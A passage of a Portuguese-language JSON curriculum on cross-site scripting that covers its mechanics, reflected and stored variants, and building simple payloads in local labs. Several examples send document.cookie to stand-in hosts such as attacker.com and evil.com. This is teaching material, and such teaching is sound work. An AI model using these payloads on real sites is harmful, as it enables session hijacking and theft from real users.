                                  "materials": [
                                    "Guia OWASP XSS Prevention Cheat Sheet",
                                    "Vídeo introdutório 'What is XSS?' no YouTube",
                                    "Diagramas OWASP"
                                  ],
                                  "tips": "Use analogias como 'confiar cegamente em um estranho falando na sua casa' para entender a confiança do navegador.",
                                  "learningObjective": "Dominar a definição e mecânica fundamental do XSS para reconhecimento inicial.",
                                  "commonMistakes": [
                                    "Confundir XSS com CSRF",
                                    "Ignorar DOM-based como 'não real'",
                                    "Achar que só afeta grandes sites"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar Entradas de Usuário Não Sanitizadas",
                                  "subSteps": [
                                    "Localize pontos de entrada: parâmetros GET/POST, cookies, headers HTTP com dados de usuário.",
                                    "Verifique reflexões diretas em HTML: procure por echo/print de input sem htmlspecialchars() ou equivalente.",
                                    "Examine contextos JavaScript: innerHTML, document.write(), eval() com user input.",
                                    "Identifique falhas em frameworks: ausência de validação em React/Vue props ou Angular bindings.",
                                    "Pratique com snippets: marque linhas vulneráveis em códigos PHP/Node.js."
                                  ],
                                  "verification": "Em um código-fonte fornecido, destaque todas as entradas não sanitizadas e justifique.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Exemplos de código vulnerável no GitHub (PortSwigger XSS Labs)",
                                    "Editor de código como VS Code"
                                  ],
                                  "tips": "Sempre pergunte: 'Onde o input do usuário vai parar na saída HTML/JS?'",
                                  "learningObjective": "Reconhecer padrões de código que falham em sanitizar inputs de usuário.",
                                  "commonMistakes": [
                                    "Focar só em forms e ignorar URL params",
                                    "Confundir validação com sanitização",
                                    "Esquecer cookies como vetores"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar Contextos de Injeção Comuns",
                                  "subSteps": [
                                    "Classifique contextos HTML: dentro de tags (<div>{input}</div>), atributos (onerror={input}), scripts (<script>{input}</script>).",
                                    "Estude escapes necessários: &lt; para <, &quot; para \", etc., dependendo do contexto.",
                                    "Simule payloads básicos: <script>alert(1)</script>, javascript:alert(1) em href.",
                                    "Identifique cenários reais: campos de busca, comentários, perfis de usuário.",
                                    "Compare código vulnerável vs. seguro usando bibliotecas como DOMPurify."
                                  ],
                                  "verification": "Crie um payload XSS para 3 contextos diferentes e explique por que funciona.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "XSS Payload List (PayloadsAllTheThings)",
                                    "Ferramenta online XSS Filter Evasion"
                                  ],
                                  "tips": "Teste payloads em ambientes locais como um servidor XAMPP para ver execução.",
                                  "learningObjective": "Mapear contextos específicos onde injeções XSS ocorrem.",
                                  "commonMistakes": [
                                    "Usar payloads complexos cedo demais",
                                    "Ignorar filtros parciais como anti-<script>",
                                    "Não considerar encoding UTF-8"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Praticar Identificação em Cenários Simulados",
                                  "subSteps": [
                                    "Configure um app web vulnerável local (DVWA ou bWAPP).",
                                    "Navegue por páginas e identifique 5 pontos potenciais de XSS.",
                                    "Teste com payloads simples e confirme execução (alert pop-up).",
                                    "Documente achados: localização, tipo de XSS, payload usado.",
                                    "Refatore um código vulnerável adicionando sanitização básica."
                                  ],
                                  "verification": "Submeta relatório com 3 vulnerabilidades identificadas e provas de conceito.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "DVWA (Damn Vulnerable Web App)",
                                    "Burp Suite Community Edition",
                                    "Navegador com DevTools"
                                  ],
                                  "tips": "Use F12 DevTools para inspecionar elementos e ver injeções em tempo real.",
                                  "learningObjective": "Aplicar conhecimento para detectar XSS em aplicações reais.",
                                  "commonMistakes": [
                                    "Executar sem ambiente isolado (risco real)",
                                    "Parar no primeiro payload que falha",
                                    "Não documentar contexto"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um site de fórum, um comentário de usuário é armazenado e exibido como <div class='comment'> + userComment + '</div>' sem escaping. Atacante posta '<script>alert(document.cookie)</script>', roubando cookies de todos os visitantes subsequentes (Stored XSS).",
                              "finalVerifications": [
                                "Lista e descreve 3 cenários comuns de XSS com exemplos de payloads.",
                                "Analisa um snippet de código de 20 linhas e identifica todas as vulnerabilidades XSS.",
                                "Diferencia corretamente Reflected vs. Stored XSS em um diagrama de fluxo.",
                                "Cria um payload funcional para um contexto HTML específico fornecido.",
                                "Explica como mitigar uma vulnerabilidade identificada com código seguro.",
                                "Identifica ausência de sanitização em um app web simulado."
                              ],
                              "assessmentCriteria": [
                                "Precisão: Identifica 90% das vulnerabilidades em testes simulados.",
                                "Completude: Documenta contexto, payload e impacto para cada achado.",
                                "Profundidade: Explica mecanismos subjacentes (confiança navegador/servidor).",
                                "Criatividade: Gera payloads variados para evasão básica de filtros.",
                                "Aplicação: Propõe fixes corretos (sanitização contextual).",
                                "Velocidade: Completa análise em tempo estimado sem erros graves."
                              ],
                              "crossCurricularConnections": [
                                "Programação Web: Integra com HTML, JavaScript e back-end (PHP/Node.js).",
                                "Ética e Direito: Discute impactos legais de divulgação responsável (bug bounties).",
                                "Análise de Sistemas: Liga a fundamentos de redes HTTP e parsing de browsers.",
                                "Desenvolvimento de Software: Enfatiza code review e secure coding practices.",
                                "Matemática/Algoritmos: Encoding/decoding strings como transformações algorítmicas."
                              ],
                              "realWorldApplication": "Em equipes de desenvolvimento web, durante code reviews para prevenir breaches como o de 2018 no British Airways (XSS roubando cartões); ou em pentests/bug bounties em plataformas como HackerOne, onde XSS é top-10 vulnerabilidades reportadas."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.4.2.1.2",
                            "name": "Construir payloads simples de XSS",
                            "description": "Criar scripts JavaScript básicos, como alert('XSS'), para demonstrar injeção em contextos HTML, URL e atributos.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar Ambiente de Teste Seguro para XSS",
                                  "subSteps": [
                                    "Instale um servidor web local como XAMPP, WAMP ou use Live Server no VS Code.",
                                    "Crie um arquivo HTML simples com pontos de injeção vulneráveis, como um campo de input refletido: <input value='[input]'>.",
                                    "Inclua seções para contextos diferentes: body text, atributo HTML e parâmetro URL (ex: ?search=[input]).",
                                    "Abra o arquivo no navegador e teste inputs neutros para confirmar reflexão.",
                                    "Garanta que o ambiente esteja isolado (localhost) para evitar impactos reais."
                                  ],
                                  "verification": "Página carrega sem erros e reflete inputs simples como 'teste' no HTML renderizado.",
                                  "estimatedTime": "20-30 minutos",
                                  "materials": [
                                    "Editor de código (VS Code)",
                                    "Servidor local (XAMPP ou similar)",
                                    "Navegador web moderno"
                                  ],
                                  "tips": "Use um diretório dedicado e nunca exponha o servidor à internet pública.",
                                  "learningObjective": "Configurar um ambiente controlado para experimentação segura com payloads XSS.",
                                  "commonMistakes": [
                                    "Expor servidor publicamente",
                                    "Usar sites reais sem permissão",
                                    "Esquecer de recarregar a página após edições"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Construir Payload Básico para Contexto HTML Body",
                                  "subSteps": [
                                    "Identifique o contexto: texto dentro de tags HTML como <div>[input]</div>.",
                                    "Crie o payload simples: <script>alert('XSS')</script>.",
                                    "Teste injetando no input refletido e submeta para ver o alert disparar.",
                                    "Analise o código fonte da página para confirmar que o script foi injetado e executado.",
                                    "Experimente variações como <img src=x onerror=alert('XSS')> para bypass simples."
                                  ],
                                  "verification": "Um alert('XSS') aparece no navegador ao submeter o payload.",
                                  "estimatedTime": "15-25 minutos",
                                  "materials": [
                                    "Ambiente de teste do Step 1",
                                    "Console do navegador (F12)"
                                  ],
                                  "tips": "Verifique o console para erros de JavaScript que possam indicar falhas.",
                                  "learningObjective": "Dominar criação de payloads que quebram fora do contexto de texto e injetam scripts no body HTML.",
                                  "commonMistakes": [
                                    "Não fechar tags corretamente",
                                    "Usar payloads complexos antes de básicos",
                                    "Ignorar case sensitivity em tags"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Adaptar Payload para Contexto de Atributos HTML",
                                  "subSteps": [
                                    "Identifique o contexto: dentro de aspas de atributos como <input value=\"[input]\">.",
                                    "Crie payload para quebrar aspas: \" onfocus=alert('XSS') autofocus=1.",
                                    "Teste injetando e clique no campo para ativar o focus e disparar o alert.",
                                    "Experimente para outros eventos: onmouseover, onload, etc.",
                                    "Inspecione o DOM renderizado para ver a injeção no atributo."
                                  ],
                                  "verification": "Alert dispara ao interagir com o elemento (ex: foco ou mouse over).",
                                  "estimatedTime": "20-30 minutos",
                                  "materials": [
                                    "Ambiente de teste atualizado com atributos refletidos",
                                    "Inspecionador de elementos (DevTools)"
                                  ],
                                  "tips": "Sempre inclua um trigger como autofocus para execução automática.",
                                  "learningObjective": "Entender como escapar de aspas em atributos e injetar eventos JavaScript.",
                                  "commonMistakes": [
                                    "Esquecer de quebrar as aspas iniciais",
                                    "Não adicionar trigger de evento",
                                    "Usar payloads sem contexto específico"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Construir Payload para Contexto URL/Parâmetros",
                                  "subSteps": [
                                    "Configure reflexão de URL: página que lê ?q=[input] e insere no HTML.",
                                    "Crie payload URL-encoded: %3Cscript%3Ealert('XSS')%3C/script%3E.",
                                    "Teste acessando URL como http://localhost/page?q=<script>alert('XSS')</script> (encode se necessário).",
                                    "Para fragmentos (#), use javascript:alert('XSS') em contextos permitidos.",
                                    "Verifique encoding/decoding com ferramentas como Burp Suite Community ou browser URL bar."
                                  ],
                                  "verification": "Alert executa ao carregar a URL com payload injetado.",
                                  "estimatedTime": "15-25 minutos",
                                  "materials": [
                                    "Ambiente com reflexão de query params",
                                    "URL encoder online ou Burp Suite"
                                  ],
                                  "tips": "Use %27 para aspas simples se o contexto usar aspas duplas.",
                                  "learningObjective": "Criar payloads que sobrevivam encoding em parâmetros URL e sejam refletidos/executados.",
                                  "commonMistakes": [
                                    "Não fazer URL encoding",
                                    "Ignorar filtros de query string",
                                    "Testar em HTTPS sem entender mixed content"
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma página de busca vulnerável com <div>Resultado para '[input]'</div>, injete <script>alert('XSS')</script> no campo de busca. O alert deve disparar, demonstrando execução de código arbitrário refletido.",
                              "finalVerifications": [
                                "Payload básico <script>alert('XSS')</script> funciona em contexto body.",
                                "Payload de atributo \" onfocus=alert('XSS') autofocus quebra e executa em inputs.",
                                "Payload URL-encoded injeta corretamente via query parameters.",
                                "Pode inspecionar DOM e identificar ponto exato de injeção.",
                                "Entende diferença entre reflected e stored XSS (embora foco em reflected).",
                                "Identifica quando um payload falha devido a contexto errado."
                              ],
                              "assessmentCriteria": [
                                "Payloads são funcionais em todos os três contextos sem erros de sintaxe.",
                                "Explicação clara do porquê cada payload funciona no contexto específico.",
                                "Ambiente de teste é seguro e isolado, sem riscos reais.",
                                "Uso correto de DevTools para debug e verificação.",
                                "Demonstração de pelo menos uma variação ou bypass simples.",
                                "Compreensão ética: enfatiza uso apenas em testes autorizados."
                              ],
                              "crossCurricularConnections": [
                                "JavaScript Fundamental: Sintaxe de scripts e eventos DOM.",
                                "HTML/CSS: Entendimento de parsing, contextos e atributos.",
                                "Ética e Direito: Conceitos de hacking ético e leis de cibersegurança.",
                                "Programação Web: Integração front-end e manipulação de inputs.",
                                "Ferramentas Dev: Uso de DevTools, encoders e proxies como Burp."
                              ],
                              "realWorldApplication": "Em testes de penetração éticos (pentests) ou bug bounties, esses payloads são usados para identificar vulnerabilidades XSS em aplicações web, permitindo relatar e corrigir riscos reais como roubo de cookies ou defacement, sempre com autorização explícita do proprietário do site."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.4.2.1.3",
                            "name": "Explicar o fluxo de execução de um ataque XSS",
                            "description": "Descrever o processo desde a injeção do script malicioso até sua execução no navegador da vítima, incluindo roubo de cookies e redirecionamentos.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Identificar vulnerabilidades e preparar o payload malicioso",
                                  "subSteps": [
                                    "Analisar a aplicação web para pontos de entrada de usuário não sanitizados, como campos de formulário, parâmetros URL ou comentários.",
                                    "Entender os tipos de XSS: reflected (imediato), stored (persistente) e DOM-based (lado cliente).",
                                    "Criar payloads simples como <script>alert('XSS')</script> para teste inicial.",
                                    "Desenvolver payloads avançados, ex: <script>document.location='http://attacker.com?cookie='+document.cookie</script> para roubo de dados.",
                                    "Testar variações para contornar filtros básicos, como usar <img src=x onerror=alert('XSS')>."
                                  ],
                                  "verification": "Escrever e validar pelo menos 3 payloads XSS diferentes em um ambiente simulado.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Documentação OWASP XSS Cheat Sheet",
                                    "Editor de texto ou playground HTML local"
                                  ],
                                  "tips": "Comece com payloads simples para confirmar vulnerabilidade antes de complexos.",
                                  "learningObjective": "Preparar scripts maliciosos adequados ao contexto da vulnerabilidade XSS.",
                                  "commonMistakes": [
                                    "Ignorar o contexto de renderização (HTML, JS, atributos)",
                                    "Não escapar caracteres como aspas duplas"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Injetar o payload na aplicação vulnerável",
                                  "subSteps": [
                                    "Selecionar o vetor de injeção, como um campo de busca ou postagem em fórum.",
                                    "Submeter o payload via interface da aplicação (formulário POST/GET).",
                                    "Observar se o payload é refletido ou armazenado sem sanitização no response HTML.",
                                    "Confirmar injeção bem-sucedida monitorando o tráfego de rede ou source code da página.",
                                    "Ajustar payload se filtros parciais bloquearem (ex: usar encodings como URL ou HTML entities)."
                                  ],
                                  "verification": "Demonstrar injeção em um lab vulnerável e capturar o request/response com payload intacto.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Ferramenta proxy como Burp Suite Community ou OWASP ZAP",
                                    "Lab DVWA ou bWAPP"
                                  ],
                                  "tips": "Use proxy para interceptar e modificar requests em tempo real.",
                                  "learningObjective": "Executar a injeção de forma precisa e indetectável inicialmente.",
                                  "commonMistakes": [
                                    "Submeter payload sem verificar sanitização no servidor",
                                    "Esquecer de codificar payload para bypass simples"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Processamento pelo servidor e entrega à vítima",
                                  "subSteps": [
                                    "Servidor processa input do atacante e armazena/reflete o payload no HTML response.",
                                    "Vítima acessa a página afetada (ex: visualiza comentário armazenado).",
                                    "Servidor envia HTML contaminado via HTTP sem quebrar a sintaxe.",
                                    "Payload viaja no response body para o navegador da vítima.",
                                    "Explicar por que o navegador da vítima interpreta o payload como código legítimo."
                                  ],
                                  "verification": "Traçar o fluxo HTTP do servidor para vítima mostrando payload no response.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Diagrama de fluxo HTTP",
                                    "Ferramentas de desenvolvedor do navegador (Network tab)"
                                  ],
                                  "tips": "Foque no fato de que o servidor não diferencia input malicioso de legítimo.",
                                  "learningObjective": "Compreender o papel do servidor na propagação do payload.",
                                  "commonMistakes": [
                                    "Confundir processamento servidor com execução cliente",
                                    "Ignorar cabeçalhos Content-Type"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Execução no navegador da vítima e exploração",
                                  "subSteps": [
                                    "Navegador parseia HTML e executa <script> no contexto DOM da vítima (same-origin).",
                                    "Script acessa APIs como document.cookie, localStorage ou geolocation.",
                                    "Executar ações: roubar cookies e enviar via fetch/XMLHttpRequest para atacante.",
                                    "Realizar redirecionamentos (window.location) ou keylogging (addEventListener).",
                                    "Persistir ataque se stored XSS, afetando múltiplas vítimas."
                                  ],
                                  "verification": "Simular execução em navegador e demonstrar roubo de cookie simulado.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Console do navegador",
                                    "Ambiente local com cookies fictícios"
                                  ],
                                  "tips": "Lembre-se: execução ocorre com privilégios da vítima, não do atacante.",
                                  "learningObjective": "Explicar impactos da execução no contexto de confiança da vítima.",
                                  "commonMistakes": [
                                    "Pensar que script roda no servidor",
                                    "Subestimar Same-Origin Policy"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Analisar consequências e detecção do fluxo completo",
                                  "subSteps": [
                                    "Resumir fluxo: injeção → processamento → entrega → execução → exploração.",
                                    "Discutir detecções: alert popups, tráfego suspeito para domínios externos.",
                                    "Explicar roubo de sessão levando a account takeover.",
                                    "Mencionar defesas como CSP, input validation para interrupção do fluxo.",
                                    "Mapear para ataques reais como worms XSS."
                                  ],
                                  "verification": "Diagrama completo do fluxo XSS com anotações de cada etapa.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Ferramenta de diagrama como Draw.io",
                                    "Relatórios de incidentes XSS"
                                  ],
                                  "tips": "Visualize o fluxo como uma cadeia: quebre um elo para prevenir.",
                                  "learningObjective": "Sintetizar o fluxo end-to-end e suas implicações.",
                                  "commonMistakes": [
                                    "Omitir contexto de confiança",
                                    "Confundir XSS com CSRF"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um blog vulnerável a stored XSS, atacante injeta <script>var i=new Image();i.src='http://attacker.com/log?cookie='+document.cookie;</script> em um comentário. Admin visualiza comentários: servidor retorna HTML com script, navegador do admin executa, enviando cookies do admin para attacker.com, permitindo hijack da sessão admin.",
                              "finalVerifications": [
                                "Descrever verbalmente o fluxo completo em menos de 2 minutos.",
                                "Identificar o momento exato da execução do script.",
                                "Explicar por que cookies são acessíveis mas não do atacante.",
                                "Listar 3 consequências reais de um ataque bem-sucedido.",
                                "Propor 2 mitigações que interrompem o fluxo.",
                                "Traçar diagrama simples do fluxo injeção-execução."
                              ],
                              "assessmentCriteria": [
                                "Precisão sequencial do fluxo (injeção → execução → exploração).",
                                "Uso correto de termos como payload, contexto DOM, same-origin.",
                                "Inclusão de exemplos concretos de payloads e ações.",
                                "Diferenciação clara entre tipos de XSS no fluxo.",
                                "Compreensão de por que roda no browser da vítima.",
                                "Capacidade de ligar a defesas preventivas."
                              ],
                              "crossCurricularConnections": [
                                "Programação Web: HTML, JavaScript e DOM manipulation.",
                                "Redes: Protocolo HTTP, requests/responses e proxies.",
                                "Ética e Direito: Leis de cibersegurança e responsabilidade em testes.",
                                "Desenvolvimento Seguro: Sanitização de inputs e OWASP Top 10.",
                                "Análise de Sistemas: Debugging e tracing de execução."
                              ],
                              "realWorldApplication": "No worm Samy de 2005 no MySpace (stored XSS), infectou 1M+ contas em horas roubando contatos; usado em phishing para roubo de sessões bancárias ou admin panels em breaches como Yahoo (2012 XSS campaigns)."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.4.2.2",
                        "name": "Tipos de Ataques XSS",
                        "description": "Classificar e diferenciar as variantes principais de XSS: Refletido, Armazenado e Baseado em DOM, com foco em suas características e contextos de exploração.",
                        "specificSkills": [
                          {
                            "id": "10.1.4.2.2.1",
                            "name": "Caracterizar XSS Refletido",
                            "description": "Explicar como o XSS refletido ocorre via parâmetros GET/POST não sanitizados em respostas imediatas, com exemplos em formulários de busca.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o conceito básico de XSS Refletido",
                                  "subSteps": [
                                    "Definir XSS como uma vulnerabilidade que permite injeção de scripts maliciosos em páginas web visualizadas por outros usuários.",
                                    "Explicar que o XSS Refletido ocorre quando o script é 'refletido' imediatamente na resposta do servidor, sem persistência.",
                                    "Diferenciar de XSS Stored (persistente) e DOM-based (client-side).",
                                    "Identificar que depende de entrada do usuário não sanitizada refletida na saída.",
                                    "Estudar o fluxo: entrada → processamento → saída imediata."
                                  ],
                                  "verification": "Escrever uma definição clara em 3-5 frases e compará-la com fontes confiáveis como OWASP.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Documentação OWASP sobre XSS",
                                    "Vídeo introdutório no YouTube sobre tipos de XSS"
                                  ],
                                  "tips": [
                                    "Use analogias como 'espelho' para o 'refletido' vs. 'armazenado em disco'.",
                                    "Anote diferenças em uma tabela para fixação."
                                  ],
                                  "learningObjective": "Dominar a definição e distinções fundamentais do XSS Refletido.",
                                  "commonMistakes": [
                                    "Confundir com XSS Stored achando que persiste no servidor.",
                                    "Ignorar que pode ocorrer em respostas não-HTML como JSON."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar parâmetros GET e POST não sanitizados",
                                  "subSteps": [
                                    "Examinar parâmetros GET: visíveis na URL, como ?search=<input>.",
                                    "Examinar parâmetros POST: em corpo da requisição, comuns em formulários.",
                                    "Demonstrar falha de sanitização: saída direta sem escape (ex: echo $_GET['q']).",
                                    "Testar injeção básica: inserir <script>alert('XSS')</script>.",
                                    "Verificar contexto de reflexão: dentro de tags HTML, atributos ou JS."
                                  ],
                                  "verification": "Criar um exemplo de URL vulnerável e simular a reflexão em um editor de código.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Ferramenta online como XSS Game do OWASP",
                                    "Editor de código como VS Code com extensão PHP/Node"
                                  ],
                                  "tips": [
                                    "Sempre cheque o contexto: HTML, atributo ou script.",
                                    "Use Burp Suite ou browser devtools para inspecionar requests."
                                  ],
                                  "learningObjective": "Identificar como entradas GET/POST levam a reflexão não sanitizada.",
                                  "commonMistakes": [
                                    "Achar que só GET é vulnerável; POST é comum em apps modernos.",
                                    "Esquecer de considerar filtros parciais que quebram payloads."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar exemplos práticos em formulários de busca",
                                  "subSteps": [
                                    "Criar um formulário de busca simples vulnerável em HTML/PHP.",
                                    "Testar com GET: /search?q=<script>alert(1)</script>.",
                                    "Testar com POST: submit de form com payload no campo de busca.",
                                    "Observar reflexão na página de resultados: 'Você buscou por <script>...'.",
                                    "Variar payloads: alert(), img src=javascript:, etc."
                                  ],
                                  "verification": "Executar o exemplo localmente e capturar screenshot do alert executando.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Servidor local XAMPP ou Node.js",
                                    "Código-fonte de exemplo vulnerável do PortSwigger WebSec Academy"
                                  ],
                                  "tips": [
                                    "Comece com payloads simples; evolua para bypass de filtros.",
                                    "Desabilite CSP temporariamente para testes."
                                  ],
                                  "learningObjective": "Aplicar conceitos em cenários reais de formulários de busca.",
                                  "commonMistakes": [
                                    "Não testar em diferentes browsers/contextos.",
                                    "Confundir reflexão com execução (verifique se script roda)."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Identificar impactos e condições de exploração",
                                  "subSteps": [
                                    "Listar condições: falta de encoding/output escaping, contexto propício.",
                                    "Descrever impactos: roubo de cookies, phishing, keylogging via JS.",
                                    "Comparar com mitigações: htmlspecialchars(), Content-Security-Policy.",
                                    "Simular exploração: roubar session cookie com document.cookie.",
                                    "Documentar passos para caracterização em relatório."
                                  ],
                                  "verification": "Redigir um relatório curto identificando uma vulnerabilidade fictícia.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Lista de payloads XSS do PayloadsAllTheThings",
                                    "Guia OWASP XSS Prevention Cheat Sheet"
                                  ],
                                  "tips": [
                                    "Pense em cadeia de ataques: XSS → CSRF → Escalação.",
                                    "Priorize contexto para payloads efetivos."
                                  ],
                                  "learningObjective": "Avaliar condições, impactos e como caracterizar em auditorias.",
                                  "commonMistakes": [
                                    "Subestimar impactos em apps single-page (SPA).",
                                    "Ignorar variações como reflected em erros 404."
                                  ]
                                }
                              ],
                              "practicalExample": "Em um site de e-commerce, o formulário de busca usa GET: /busca.php?q=produto. Um atacante insere q=<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>. O servidor reflete: 'Nenhum resultado para <script>...</script>', executando o script e enviando cookies para evil.com.",
                              "finalVerifications": [
                                "Explicar o fluxo completo de um ataque XSS Refletido em 5 frases.",
                                "Identificar vulnerabilidade em um snippet de código PHP/Node fornecido.",
                                "Criar e testar um payload funcional em ambiente controlado.",
                                "Diferenciar corretamente de outros tipos de XSS.",
                                "Listar 3 mitigações específicas e por quê funcionam.",
                                "Simular impacto roubando um cookie fictício."
                              ],
                              "assessmentCriteria": [
                                "Precisão conceitual: definições corretas sem confusões (30%).",
                                "Exemplos práticos: payloads e cenários realistas (25%).",
                                "Análise técnica: identificação de parâmetros e contextos (20%).",
                                "Compreensão de impactos e mitigações (15%).",
                                "Clareza na comunicação: relatórios ou explicações estruturadas (10%)."
                              ],
                              "crossCurricularConnections": [
                                "Desenvolvimento Web: Sanitização em linguagens como PHP, JavaScript e Python.",
                                "Redes e Protocolos: Análise de HTTP requests/responses com Wireshark.",
                                "Programação: Manipulação de strings e encoding (HTML entities).",
                                "Ética e Direito: Regulamentações como LGPD/GDPR em breaches de segurança.",
                                "Análise de Dados: Logs de acessos para detecção de tentativas de XSS."
                              ],
                              "realWorldApplication": "Em auditorias de penetração (pentests) ou bug bounties, caracterizar XSS Refletido permite priorizar correções em apps web vulneráveis, prevenindo roubo de sessões e ataques em massa em sites de alta traffic como e-commerces ou portais de notícias."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.4.2.1.1"
                            ]
                          },
                          {
                            "id": "10.1.4.2.2.2",
                            "name": "Caracterizar XSS Armazenado",
                            "description": "Descrever o XSS persistente onde scripts são armazenados em bancos de dados e executados para todos os usuários que visualizam o conteúdo.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender a Definição e Características Básicas do XSS Armazenado",
                                  "subSteps": [
                                    "Estude a definição oficial de XSS Armazenado conforme OWASP: injeção de scripts maliciosos em dados persistentes como bancos de dados.",
                                    "Identifique características chave: persistente, afeta múltiplos usuários, não requer interação direta do vítima.",
                                    "Compare brevemente com XSS Refletido (não persistente) e DOM-based (client-side).",
                                    "Anote exemplos de contextos: comentários de blog, perfis de usuário, fóruns.",
                                    "Revise impactos: roubo de cookies, phishing, defacement para todos os visualizadores."
                                  ],
                                  "verification": "Escreva um parágrafo definindo XSS Armazenado e listando 3 características únicas.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Guia OWASP XSS Prevention Cheat Sheet",
                                    "Vídeo introdutório sobre tipos de XSS no YouTube (5-10 min)"
                                  ],
                                  "tips": "Use analogias como 'vírus em um livro de biblioteca' para lembrar da persistência.",
                                  "learningObjective": "Definir precisamente XSS Armazenado e diferenciá-lo de outros tipos.",
                                  "commonMistakes": [
                                    "Confundir persistência com execução imediata",
                                    "Achar que afeta só o atacante"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar o Fluxo de Funcionamento do Ataque",
                                  "subSteps": [
                                    "Desenhe o fluxo: 1) Atacante submete input malicioso (ex: <script>alert('XSS')</script>); 2) App armazena sem sanitização no DB.",
                                    "Trace a retrieval: App busca dados do DB e renderiza na página sem escaping para vítimas.",
                                    "Explique execução: Browser da vítima interpreta o script como parte legítima da página.",
                                    "Identifique pontos vulneráveis: campos de input user-controlled que vão para storage persistente.",
                                    "Simule mentalmente com um diagrama simples de request/response."
                                  ],
                                  "verification": "Crie um diagrama de fluxo com 4 etapas principais e rotule cada uma.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Ferramenta de desenho online como Draw.io",
                                    "Exemplos de fluxogramas XSS no OWASP"
                                  ],
                                  "tips": "Pense em termos de 'input -> store -> output -> execute' como um ciclo fechado.",
                                  "learningObjective": "Mapear o ciclo completo de vida do XSS Armazenado.",
                                  "commonMistakes": [
                                    "Ignorar a fase de storage no banco",
                                    "Confundir com execução server-side"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Identificar Vetores de Ataque e Payloads Típicos",
                                  "subSteps": [
                                    "Liste vetores comuns: posts em fóruns, biografias de usuário, mensagens em chat persistente.",
                                    "Estude payloads básicos: <script>alert(document.cookie)</script>, keyloggers via formjacking.",
                                    "Analise evasões: usar event handlers como onload, ou encodings para burlar filtros iniciais.",
                                    "Teste conceitualmente: imagine submissão em um campo texto sem validação.",
                                    "Registre 5 payloads variados e seus efeitos esperados."
                                  ],
                                  "verification": "Liste 3 vetores e 2 payloads por vetor, explicando o impacto em vítimas.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "PayloadsAllTheThings GitHub repo (seção XSS)",
                                    "PortSwigger Web Academy labs gratuitos"
                                  ],
                                  "tips": "Sempre teste payloads em contextos HTML, não apenas alert().",
                                  "learningObjective": "Reconhecer entradas maliciosas e contextos propensos a XSS Stored.",
                                  "commonMistakes": [
                                    "Usar payloads que só funcionam em Refletido",
                                    "Esquecer de considerar múltiplas vítimas"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Avaliar Impactos, Detecção e Diferenças com Outros XSS",
                                  "subSteps": [
                                    "Descreva impactos ampliados: wormable (auto-propagação), roubo de sessão em massa.",
                                    "Discuta detecção: monitorar logs de input suspeito, scans DAST/SAST.",
                                    "Compare diferenças: Stored é server-persistente vs Refletido (URL-based) vs DOM (client-only).",
                                    "Liste mitigações iniciais: input validation, output encoding (HTML entities).",
                                    "Sintetize em uma tabela comparativa de 3 tipos de XSS."
                                  ],
                                  "verification": "Crie uma tabela comparando Stored XSS com outros 2 tipos em 4 critérios (persistência, escopo, detecção).",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Tabela comparativa OWASP",
                                    "Ferramenta Google Sheets para tabela"
                                  ],
                                  "tips": "Foque em 'por que Stored é mais perigoso': escala de vítimas.",
                                  "learningObjective": "Diferenciar XSS Stored e entender suas implicações únicas.",
                                  "commonMistakes": [
                                    "Subestimar escala de impacto",
                                    "Confundir mitigações com prevenção completa"
                                  ]
                                }
                              ],
